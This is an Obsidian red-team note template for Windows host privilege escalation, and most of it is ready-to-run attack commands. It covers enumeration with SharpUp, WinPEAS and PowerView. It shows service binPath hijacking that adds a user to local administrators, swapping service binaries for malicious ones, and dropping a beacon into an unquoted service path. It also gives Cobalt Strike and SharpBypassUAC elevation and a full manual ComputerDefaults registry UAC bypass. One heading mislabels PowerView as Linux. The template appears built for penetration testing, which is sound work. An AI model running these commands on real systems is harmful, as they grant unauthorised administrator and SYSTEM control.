---
# Attack-specific fields
privesc_method: sharpup
target_service:
service_binary_path:
unquoted_service_path:
uac_method: computerdefaults
notes:
---

# Host Privilege Escalation

> [!abstract] Attack Summary
> Escalate from a standard user or low-privileged service account to **SYSTEM** or **local admin** using Windows misconfigurations. Common vectors: **weak service permissions**, **weak service binary permissions**, **unquoted service paths**, and **UAC bypass**.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const methods = ["sharpup","winpeas","manual"];
const methodOptions = methods.map(m => `option(${m})`).join(',');

dv.table(["Field", "Value"], [
  ["Enum Method",        `\`INPUT[inlineSelect(defaultValue(${p.privesc_method ?? 'sharpup'}),${methodOptions}):privesc_method]\``],
  ["Target Service",     `\`INPUT[text:target_service]\``],
  ["Unquoted Path",      `\`INPUT[text:unquoted_service_path]\``],
]);
```

---

## Step 1 — Enumerate Privilege Escalation Vectors

**Windows — SharpUp**
```dataviewjs
dv.paragraph("```bash\n# Run full audit\nexecute-assembly C:\\Tools\\SharpUp\\SharpUp\\bin\\Release\\SharpUp.exe audit\n\n# Specific checks\nexecute-assembly C:\\Tools\\SharpUp\\SharpUp\\bin\\Release\\SharpUp.exe audit ModifiableServices\nexecute-assembly C:\\Tools\\SharpUp\\SharpUp\\bin\\Release\\SharpUp.exe audit ModifiableServiceBinaries\nexecute-assembly C:\\Tools\\SharpUp\\SharpUp\\bin\\Release\\SharpUp.exe audit UnquotedServicePath\nexecute-assembly C:\\Tools\\SharpUp\\SharpUp\\bin\\Release\\SharpUp.exe audit AlwaysInstallElevated\n```");
```

**Windows — WinPEAS**
```dataviewjs
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\winPEAS\\winPEASany.exe quiet servicesinfo\n```");
```

**Linux — PowerView on target**
```dataviewjs
dv.paragraph("```powershell\n# From a PowerShell session\nFind-LocalAdminAccess\nGet-ServiceUnquoted\nGet-ModifiableServiceFile\nGet-ModifiableService\n```");
```

---

## Method A — Weak Service Permissions

> [!info] The service SCM configuration has weak ACLs allowing modification of binPath.

**Windows — Check and exploit**
```dataviewjs
const p = dv.current();
const svc = p?.target_service || "TARGET_SERVICE";
dv.paragraph("```bash\n# Check service permissions\nexecute-assembly C:\\Tools\\AccessChk\\accesschk64.exe -accepteula -ucqv " + svc + "\n\n# If you have SERVICE_CHANGE_CONFIG:\n# Method 1: Cobalt Strike beacon command\nexecute-assembly C:\\Tools\\SharpUp\\SharpUp\\bin\\Release\\SharpUp.exe exploit ModifiableServices\n\n# Method 2: sc.exe\nsc config " + svc + " binPath= \"cmd /c 'net localgroup administrators USER /add'\"\nsc start " + svc + "\n\n# Method 3: PowerShell\nSet-ServiceBinaryPath -ServiceName " + svc + " -Path 'C:\\Windows\\System32\\cmd.exe /c whoami > C:\\output.txt'\n```");
```

Target service: `INPUT[text:target_service]`

---

## Method B — Weak Service Binary Permissions

> [!info] The service binary file has weak ACLs — you can overwrite or replace it.

**Windows**
```dataviewjs
const p = dv.current();
const svc     = p?.target_service || "TARGET_SERVICE";
const binPath = p?.service_binary_path || "C:\\Path\\to\\service.exe";
dv.paragraph("```bash\n# Find binary path\nsc qc " + svc + "\n\n# Check permissions on the binary\nexecute-assembly C:\\Tools\\AccessChk\\accesschk64.exe -accepteula -quvw \"" + binPath + "\"\n\n# If writable, replace with malicious binary\ncopy malicious.exe \"" + binPath + "\"\n\n# Restart service\nsc stop " + svc + "\nsc start " + svc + "\n\n# Or wait for system reboot/service restart\n```");
```

---

## Method C — Unquoted Service Path

> [!info] A service path with spaces but no quotes allows binary hijacking if a writable directory precedes the binary.

**Windows**
```dataviewjs
const p = dv.current();
const unquotedPath = p?.unquoted_service_path || "C:\\Program Files\\Target Service\\service.exe";
dv.paragraph("```bash\n# Find unquoted paths\nwmic service get name,pathname | findstr /i /v \"C:\\Windows\" | findstr /i /v \"\\\"\"\n\n# Example unquoted path:\n# C:\\Program Files\\Target Service\\service.exe\n# Windows tries in order:\n# 1. C:\\Program.exe\n# 2. C:\\Program Files\\Target.exe     <- place payload here if writable\n# 3. C:\\Program Files\\Target Service\\service.exe\n\n# Place payload in writable location that appears first\ncopy beacon.exe 'C:\\Program Files\\Target.exe'\n\n# Restart service\nsc stop TARGET_SERVICE && sc start TARGET_SERVICE\n```");
```

Unquoted path: `INPUT[text:unquoted_service_path]`

---

## Method D — UAC Bypass

> [!info] Bypass User Account Control to elevate a medium-integrity process to high-integrity without a UAC prompt.

**Windows — Cobalt Strike elevate**
```dataviewjs
const p = dv.current();
dv.paragraph("```bash\n# List available UAC bypass modules\nelevate\n\n# Common bypasses:\nelevate uac-token-duplication LISTENER\nelevate svc-exe LISTENER\n\n# Third-party: UACME / SharpBypassUAC\nexecute-assembly C:\\Tools\\SharpBypassUAC\\SharpBypassUAC.exe -b computerdefaults\nexecute-assembly C:\\Tools\\SharpBypassUAC\\SharpBypassUAC.exe -b sdclt\nexecute-assembly C:\\Tools\\SharpBypassUAC\\SharpBypassUAC.exe -b fodhelper\n```");
```

**Windows — Manual ComputerDefaults bypass**
```dataviewjs
dv.paragraph("```powershell\n# Requires medium-integrity shell\n$registry = [Microsoft.Win32.Registry]::CurrentUser\n$key = $registry.CreateSubKey('Software\\Classes\\ms-settings\\Shell\\Open\\command')\n$key.SetValue('', 'C:\\Windows\\System32\\cmd.exe')\n$key.SetValue('DelegateExecute', '')\n\n# Trigger\nStart-Process -FilePath 'C:\\Windows\\System32\\ComputerDefaults.exe'\n\n# Cleanup after elevation\nRemove-Item -Path 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force\n```");
```

---

## Post-Escalation — Add to Local Admins

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const username = b?.username ?? "USER";
dv.paragraph("```bash\n# Add user to local admins\nnet localgroup administrators " + (b?.domain?.split('.')[0]?.toUpperCase() || "DOMAIN") + "\\" + username + " /add\n\n# Verify\nnet localgroup administrators\n\n# Get SYSTEM token\ngetsystem\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - SharpUp/WinPEAS execution in memory — AV/EDR may detect.
> - Service modification: **Event 7040** (service config changed), **Event 7045** (service installed).
> - UAC bypass: Registry modifications, unusual process parent chains.
> - `getsystem` attempts named pipe impersonation — may generate **Event 4672**.

---

## Notes & Results

`INPUT[textarea:notes]`
